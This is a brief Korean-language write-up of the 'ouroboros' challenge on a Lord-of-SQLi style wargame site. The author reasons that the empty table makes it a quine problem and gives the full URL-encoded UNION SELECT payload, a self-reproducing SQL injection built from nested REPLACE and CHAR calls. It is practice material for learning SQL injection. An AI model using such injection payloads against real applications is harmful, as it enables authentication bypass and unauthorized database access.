# LOS2 - ouroboros

Quine문제였다.

그렇다고 판단한 근거는 테이블에 아무것도 없었기 때문이다.

아래의 페이로드로 풀었다. 다신 하기싫다.

```
https://los.rubiya.kr/chall/ouroboros_e3f483f087c922c84373b49950c212a9.php?pw=%27union%20SELECT%20REPLACE(REPLACE(%27%22union%20SELECT%20REPLACE(REPLACE(%22$%22,CHAR(34),CHAR(39)),CHAR(36),%22$%22)%20AS%20Quine--%20-%27,CHAR(34),CHAR(39)),CHAR(36),%27%22union%20SELECT%20REPLACE(REPLACE(%22$%22,CHAR(34),CHAR(39)),CHAR(36),%22$%22)%20AS%20Quine--%20-%27)%20AS%20Quine--%20-
``